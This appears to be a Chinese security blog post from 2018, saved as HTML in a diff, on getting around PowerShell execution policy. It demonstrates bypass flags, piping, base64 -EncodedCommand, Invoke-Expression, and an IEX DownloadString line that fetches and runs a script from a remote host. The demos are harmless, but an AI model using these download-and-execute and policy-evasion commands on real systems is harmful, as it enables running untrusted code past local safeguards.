@@ -1,0 +1,344 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>powershell execution bypass | X1r0z Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="PowerShell execution policy 是用来决定哪些类型的 PowerShell 代码可以在系统中运行.  1234Restricted - 不允许任何脚本运行AllSigned - 只能允许经过数字签名的脚本RemoteSigned - 运行本地脚本不需要数字签名 远程的需要Unrestricted - 允许任何脚本运行 用 Get-ExecutionPolicy 查看当前">
+<meta name="keywords" content="bypass,powershell">
+<meta property="og:type" content="article">
+<meta property="og:title" content="powershell execution bypass">
+<meta property="og:url" content="https://exp10it.cn/2018/05/04/powershell-execution-bypass/index.html">
+<meta property="og:site_name" content="X1r0z Blog">
+<meta property="og:description" content="PowerShell execution policy 是用来决定哪些类型的 PowerShell 代码可以在系统中运行.  1234Restricted - 不允许任何脚本运行AllSigned - 只能允许经过数字签名的脚本RemoteSigned - 运行本地脚本不需要数字签名 远程的需要Unrestricted - 允许任何脚本运行 用 Get-ExecutionPolicy 查看当前">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2018-08-02T03:04:01.753Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="powershell execution bypass">
+<meta name="twitter:description" content="PowerShell execution policy 是用来决定哪些类型的 PowerShell 代码可以在系统中运行.  1234Restricted - 不允许任何脚本运行AllSigned - 只能允许经过数字签名的脚本RemoteSigned - 运行本地脚本不需要数字签名 远程的需要Unrestricted - 允许任何脚本运行 用 Get-ExecutionPolicy 查看当前">
+  
+    <link rel="alternate" href="/atom.xml" title="X1r0z Blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/plugin/bganimation/bg.css">
+  
+
+</head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <div class="outer">
+        <div class="widget-wrap mobile-header">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <img class="avatar" src="/plugin/images/avatar.jpg">
+    <h2 class="author">X1r0z</h2>
+    <h3 class="description">剑之所指, 心之所向</h3>
+    <div class="count-box">
+      <a href="/archives"><div><strong>97</strong><br>文章</div></a>
+      <a href="/categories"><div><strong>10</strong><br>分类</div></a>
+      <a href="/tags"><div><strong>54</strong><br>标签</div></a>
+    </div>
+    <ul class="blog-link">
+     
+          <a href="/" title="Home">
+            <li>主页</li>
+          </a>
+        
+          <a href="/archives" title="Archives">
+            <li>归档</li>
+          </a>
+        
+          <a href="/categories" title="Categories">
+            <li>分类</li>
+          </a>
+        
+          <a href="/tags" title="Tags">
+            <li>标签</li>
+          </a>
+        
+          <a href="/about" title="About">
+            <li>关于</li>
+          </a>
+        
+          <a href="/project" title="Project">
+            <li>项目</li>
+          </a>
+        
+    </ul>
+  </div>
+</div>
+
+        <section id="main"><article id="post-powershell-execution-bypass" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/05/04/powershell-execution-bypass/" class="article-date">
+  <time class="post-time" datetime="2018-05-03T16:00:00.000Z" itemprop="datePublished">
+    <span class="post-month">5月</span><br/>
+    <span class="post-day">04</span>
+  </time>
+</a>
+   
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      powershell execution bypass
+    </h1>
+  
+
+        <div>
+          
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/bypass/">bypass</a>
+  </div>
+
+          
+              
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <blockquote>
+<p> PowerShell execution policy 是用来决定哪些类型的 PowerShell 代码可以在系统中运行.</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Restricted - 不允许任何脚本运行</span><br><span class="line">AllSigned - 只能允许经过数字签名的脚本</span><br><span class="line">RemoteSigned - 运行本地脚本不需要数字签名 远程的需要</span><br><span class="line">Unrestricted - 允许任何脚本运行</span><br></pre></td></tr></table></figure>
+<p>用 Get-ExecutionPolicy 查看当前的策略.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\46224\Desktop&gt; Get-ExecutionPolicy</span><br><span class="line">Restricted</span><br></pre></td></tr></table></figure>
+<a id="more"></a>
+<h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><p>将 ExecutionPolicy 设置为 Bypass 绕过策略限制.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\46224\Desktop&gt; powershell.exe -ExecutionPolicy Bypass -File .\test.ps1</span><br><span class="line">hello world</span><br></pre></td></tr></table></figure>
+<h2 id="UnRestricted"><a href="#UnRestricted" class="headerlink" title="UnRestricted"></a>UnRestricted</h2><p>将 ExecutionPolicy 设置为 UnRestricted 更改策略.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\46224\Desktop&gt; PowerShell.exe -ExecutionPolicy UnRestricted -File .\test.ps1</span><br><span class="line">hello world</span><br></pre></td></tr></table></figure>
+<h2 id="RemoteSigned"><a href="#RemoteSigned" class="headerlink" title="RemoteSigned"></a>RemoteSigned</h2><p>将 ExecutionPolicy 设置为 RemoteSigned 更改策略.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\46224\Desktop&gt; PowerShell.exe -ExecutionPolicy RemoteSigned -File .\test.ps1</span><br><span class="line">hello world</span><br></pre></td></tr></table></figure>
+<h2 id="Pipe"><a href="#Pipe" class="headerlink" title="Pipe"></a>Pipe</h2><p>通过管道执行脚本.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\46224\Desktop&gt; Get-Content .\test.ps1 | powershell.exe -</span><br><span class="line">hello world</span><br></pre></td></tr></table></figure>
+<p>类似的还有 type 命令.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\46224\Desktop&gt; type .\test.ps1 | powershell.exe -</span><br><span class="line">hello world</span><br></pre></td></tr></table></figure>
+<h2 id="IEX"><a href="#IEX" class="headerlink" title="IEX"></a>IEX</h2><p>通过 IEX 远程下载脚本执行 不受策略限制.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\46224\Desktop&gt; powershell &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;http://xss1.ga/test.ps1&apos;)&quot;</span><br><span class="line">hello world</span><br></pre></td></tr></table></figure>
+<h2 id="Encode"><a href="#Encode" class="headerlink" title="Encode"></a>Encode</h2><p>unicode + base64 编码执行.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\46224\Desktop&gt; $command = Get-Content .\test.ps1</span><br><span class="line">PS C:\Users\46224\Desktop&gt; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)</span><br><span class="line">PS C:\Users\46224\Desktop&gt; $encodedCommand = [Convert]::ToBase64String($bytes)</span><br><span class="line">PS C:\Users\46224\Desktop&gt; powershell.exe -EncodedCommand $encodedCommand</span><br><span class="line">hello world</span><br></pre></td></tr></table></figure>
+<h2 id="Command"><a href="#Command" class="headerlink" title="Command"></a>Command</h2><p>好像会有引号的转义问题, 更改了下执行的脚本.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\46224\Desktop&gt; echo &quot;echo &apos;hello world&apos;&quot; &gt; .\test.ps1</span><br><span class="line">PS C:\Users\46224\Desktop&gt; $command = Get-Content .\test.ps1</span><br><span class="line">PS C:\Users\46224\Desktop&gt; powershell -command &quot;$command&quot;</span><br><span class="line">hello world</span><br></pre></td></tr></table></figure>
+<h2 id="Invoke-Expression"><a href="#Invoke-Expression" class="headerlink" title="Invoke-Expression"></a>Invoke-Expression</h2><p>Invoke-Expression 将它接受到的任何字符串当作 powershell 代码执行.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\46224\Desktop&gt; Get-Content .\test.ps1 | Invoke-Expression</span><br><span class="line">hello world</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://exp10it.cn/2018/05/04/powershell-execution-bypass/" data-id="cjkbzjdn0007kbqnt9aq6atja" class="article-share-link">分享</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/bypass/">bypass</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/powershell/">powershell</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2018/05/05/php-webshell-without-alphanum/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">上一篇</strong>
+      <div class="article-nav-title">
+        
+          php shell without alphanum
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2018/05/03/msf-shellcode-bypass/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">下一篇</strong>
+      <div class="article-nav-title">msf shellcode bypass</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    <div class="widget-wrap">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <h1 class="blog-title">X1r0z Blog</h1>
+    <h2 class="blog-subtitle">剑之所指, 心之所向</h2>
+    <ul class="blog-link">
+     
+          <a href="/" title="Home">
+            <li>主页</li>
+          </a>
+        
+          <a href="/archives" title="Archives">
+            <li>归档</li>
+          </a>
+        
+          <a href="/categories" title="Categories">
+            <li>分类</li>
+          </a>
+        
+          <a href="/tags" title="Tags">
+            <li>标签</li>
+          </a>
+        
+          <a href="/about" title="About">
+            <li>关于</li>
+          </a>
+        
+          <a href="/project" title="Project">
+            <li>项目</li>
+          </a>
+        
+    </ul>
+  </div>
+</div>
+
+  
+    <div class="widget-wrap">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <img class="avatar" src="/plugin/images/avatar.jpg">
+    <h2 class="author">X1r0z</h2>
+    <h3 class="description">剑之所指, 心之所向</h3>
+    <div class="count-box">
+      <a href="/archives"><div><strong>97</strong><br>文章</div></a>
+      <a href="/categories"><div><strong>10</strong><br>分类</div></a>
+      <a href="/tags"><div><strong>54</strong><br>标签</div></a>
+    </div>
+
+
+
+    <div class="social-link">
+      
+        <a class="hvr-bounce-in" href="https://github.com/X1r0z" target="_blank" title="Github">
+          Github
+        </a>
+      
+    </div>
+
+    <div class="friend-link">
+      <h2>友情链接</h2>
+      
+        <a class="hvr-bounce-in" href="https://chabug.org/" target="_blank" title="ChaBug">
+          ChaBug
+        </a>
+      
+        <a class="hvr-bounce-in" href="http://blog.dyboy.cn/" target="_blank" title="DYBOY">
+          DYBOY
+        </a>
+      
+        <a class="hvr-bounce-in" href="https://exp10it.cn/" target="_blank" title="超级无敌宇宙大帅比">
+          超级无敌宇宙大帅比
+        </a>
+      
+    </div>
+  </div>
+</div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy;2017 - 2018 X1r0z<br>
+      由<a href="http://hexo.io/" target="_blank">Hexo</a>强力驱动 | 
+      主题-<a href="https://github.com/ShanaMaid/hexo-theme-shana">Shana</a>
+      
+    </div>
+    
+  </div>
+</footer>
+    </div>
+    
+
+<script src="//apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
+<script src="//apps.bdimg.com/libs/wow/0.1.6/wow.min.js"></script>
+<script>
+new WOW().init();
+</script>   
+
+
+  <link rel="stylesheet" href="/plugin/fancybox/jquery.fancybox.css">
+  <script src="/plugin/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+  <link rel="stylesheet" href="/plugin/galmenu/GalMenu.css">
+  <script src="/plugin/galmenu/GalMenu.js"></script>
+  <div class="GalMenu GalDropDown">
+      <div class="circle" id="gal">
+        <div class="ring">
+          
+            <a href="/" title="" class="menuItem">首页</a>
+          
+            <a href="/tags" title="" class="menuItem">标签</a>
+          
+            <a href="/categories" title="" class="menuItem">分类</a>
+          
+            <a href="/archives" title="" class="menuItem">归档</a>
+          
+            <a href="/about" title="" class="menuItem">关于</a>
+          
+            <a href="/project" title="" class="menuItem">项目</a>
+          
+        </div>
+        
+          <audio id="audio" src="plugin/galmenu/wulusai.mp3"></audio>
+        
+      </div> 
+</div>
+<div id="overlay" style="opacity: 1; cursor: pointer;"></div>
+  <script type="text/javascript">var items = document.querySelectorAll('.menuItem');
+    for (var i = 0,
+    l = items.length; i < l; i++) {
+      items[i].style.left = (50 - 35 * Math.cos( - 0.5 * Math.PI - 2 * (1 / l) * i * Math.PI)).toFixed(4) + "%";
+      items[i].style.top = (50 + 35 * Math.sin( - 0.5 * Math.PI - 2 * (1 / l) * i * Math.PI)).toFixed(4) + "%"
+    }</script>
+<script type="text/javascript">
+  $(document).ready(function() {
+    $('body').GalMenu({
+      'menu': 'GalDropDown'
+    })
+  });
+</script>
+
+  <section class="hidden-xs"> 
+  <ul class="cb-slideshow"> 
+    <li><span>苟利</span></li> 
+    <li><span>国家</span></li> 
+    <li><span>生死以</span></li> 
+    <li><span>岂能</span></li> 
+    <li><span>祸福</span></li> 
+    <li><span>趋避之</span></li> 
+  </ul>
+</section>
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
